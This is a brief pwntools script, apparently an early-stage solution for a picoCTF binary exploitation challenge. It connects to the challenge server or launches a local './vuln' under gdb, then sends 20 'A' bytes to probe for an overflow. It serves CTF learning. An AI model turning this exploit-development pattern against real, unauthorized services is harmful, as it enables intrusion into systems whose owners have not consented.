from pwn import *
context.terminal = ['/usr/bin/gdb', '-q']
script = 'b *main'
if args['REMOTE']:
    p = remote('saturn.picoctf.net', 52245)
else:
    p = process('./vuln')
    gdb.attach(p, gdbscript=script)


p.recvuntil(b'Input: ')
p.sendline(b'A' * 20)

p.interactive()